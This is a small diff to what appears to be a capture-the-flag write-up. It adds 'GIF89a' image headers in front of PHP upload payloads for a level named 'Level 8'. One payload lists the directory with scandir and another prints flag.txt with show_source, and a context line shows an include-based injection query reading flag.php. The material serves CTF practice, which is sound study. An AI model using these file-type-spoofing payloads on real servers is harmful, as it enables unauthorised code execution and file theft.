@@ -64,11 +64,15 @@ q=${include%19$_REQUEST[gg]}$flag}&gg=flag.php #any whitespace  and '@' characte
 ## Level 8
 part one:
 ```php
+GIF89a
+
 <?php $s=scandir("."); echo $s[3]; ?> #returns theres a flag.txt inside the directory
 ```
 
 part two:
 ```php
+GIF89a
+
 <?php $s=show_source("flag.txt");echo $s; ?>
 ```
 
